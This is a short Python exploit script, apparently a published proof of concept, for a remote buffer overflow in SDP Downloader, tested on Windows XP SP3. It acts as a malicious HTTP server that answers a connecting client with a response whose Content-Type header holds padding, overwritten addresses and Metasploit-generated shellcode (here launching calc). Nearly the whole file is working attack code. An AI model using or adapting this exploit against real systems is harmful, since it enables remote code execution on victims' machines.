#!/usr/bin/python
#Bug : SDP Downloader (http_response) Remote Buffer Overflow Exploit
# by: sup3r
#Tested on : Xp sp3
#http://sdp.ppona.com/

from payload import buf
import socket
import struct
from scapy import *
def shell_attack(target_machine, target_port):

    # win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
  
    buffer =  '\x41'*4
    buffer += str(buf)
    buffer += '\x41'*(65584-len(str(buf)))
    buffer += '\xF0\xF1\xAB\x00'	
    #00ABF1F0(shellcode address)
    buffer += '\x41'*36
    buffer += '\xBC\xEB\x12\x00'	
    #0012EBBC Stack section (writable)
    buffer += '\x43'*9000

    header=(
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: video/"+buffer+"\r\n"
    "Last-Modified: 20 Mar 2010 09:50:10 GMT\r\n"
    "Accept-Ranges: bytes\r\n"
    "ETag: \"075a1fc3d4dc41:0\"\r\n"
    "Server: Microsoft-IIS/7.5\r\n"
    "X-Powered-By: ASP.NET\r\n"
    "Date: Sat, 20 Mar 2010 14:31:46 GMT\r\n"
    "Connection: close\r\n"
    "Content-Length: 324\r\n\r\n")

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((target_machine, target_port))
    s.listen(1)
    
    c, addr = s.accept()
   
    c.recv(1024)
    header = bytes(header, 'utf-8')
    c.send(header)
    c.send(header)
    
    c.close()
    s.close()